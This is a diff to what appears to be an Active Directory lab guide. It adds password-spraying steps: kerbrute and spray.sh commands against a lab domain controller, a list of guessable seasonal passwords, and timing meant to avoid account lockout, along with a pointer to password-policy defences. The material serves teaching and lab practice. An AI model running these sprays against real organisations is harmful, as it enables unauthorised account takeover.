@@ -31,43 +31,47 @@ Password spraying is a type of brute force attack. An attacker will try a defaul
 
 #### Spraying a single password
 
-{% tabs %}
-{% tab title="Kerbrute" %}
+To spray a single password from our kali machine we will use kerbrute again. But this time we will use the passwordspray functionality. We will spray the password `Welcome2022!` against all the users we enumerated earlier.
+
 ```
 ./kerbrute_linux_amd64 passwordspray -d amsterdam.bank.local --dc 10.0.0.3 ~/adlab/users.txt 'Welcome2022!'
 ```
-{% endtab %}
 
-{% tab title="Spray" %}
+![](<../../../.gitbook/assets/image (11).png>)
 
-{% endtab %}
-
-{% tab title="Crackmapexec" %}
-
-{% endtab %}
-
-{% tab title="Domainpasswordspray" %}
-
-{% endtab %}
-{% endtabs %}
+{% hint style="warning" %}
+It is recommended to not spray more then one password every 30 minutes to prevent locking out accounts. We dont have access to the domain yet and can't retrieve the current passwordpolicy.
+{% endhint %}
 
 #### Spraying a small list of passwords
 
-{% tabs %}
-{% tab title="Kerbrute" %}
+To spray a list of passwords we can use Spray. First create a `passwords.txt` file and copy the following passwords:
 
-{% endtab %}
+```
+Spring2022!
+Winter2022!
+Autumn2022!
+Summer2022!
+Welcome2022!
+Bank2022!
+AmsterdamBank2022!
+```
 
-{% tab title="Second Tab" %}
+Since we don't want to lock any accounts we will try one password every 31 minutes by using the following command:
 
-{% endtab %}
-{% endtabs %}
+```
+bash spray.sh smb 10.0.0.3 ~/adlab/users.txt ~/adlab/passwords.txt 1 31 passwordspray.txt
+```
 
 ## Defending
 
 ### Recommendations
 
-*
+Implement a strong password policy:
+
+{% content-ref url="../../../defence/hardening/strong-password-policy.md" %}
+[strong-password-policy.md](../../../defence/hardening/strong-password-policy.md)
+{% endcontent-ref %}
 
 ### Detection
 
